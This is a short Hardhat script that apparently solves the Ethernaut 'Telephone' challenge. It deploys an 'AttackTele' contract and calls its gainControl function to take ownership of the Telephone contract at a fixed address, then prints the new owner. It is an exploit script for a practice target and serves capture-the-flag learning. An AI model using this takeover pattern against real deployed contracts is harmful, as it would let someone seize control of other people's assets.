import { ethers } from "hardhat";


async function main() {
    const [account] = await ethers.getSigners();

    const AttackTele = await ethers.getContractFactory("AttackTele");
    const attack = await AttackTele.deploy();

    const Telephone = await ethers.getContractFactory("Telephone");
    const tele = Telephone.attach("0x4e4caFEe1ff94fD059369a1a5C677Dd65a757825");

    let tx = await attack.gainControl(account.address);
    await tx.wait();

    console.log(account.address);
    console.log(await tele.owner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });